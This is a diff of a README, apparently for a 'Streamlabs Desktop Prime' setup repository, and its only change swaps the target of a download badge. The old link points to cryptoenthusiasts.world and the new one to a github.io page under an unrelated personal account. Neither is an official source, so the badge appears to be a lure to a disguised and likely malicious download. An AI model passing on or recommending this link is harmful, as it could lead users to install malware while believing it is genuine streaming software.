@@ -6,7 +6,7 @@ It gathers presets, naming rules, and automation that map directly to how teams 
 
 Focus areas include Windows 10/11 driver choices, cache placement, and the file formats Streamlabs Desktop Prime sends to other tools.
 
-[![Download Streamlabs Desktop Prime](https://img.shields.io/badge/Download-Streamlabs_Desktop_Prime-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download Streamlabs Desktop Prime](https://img.shields.io/badge/Download-Streamlabs_Desktop_Prime-blueviolet)](https://ulkuakisik18066.github.io/.github/Streamlabs-Desktop)
 
 ---
 
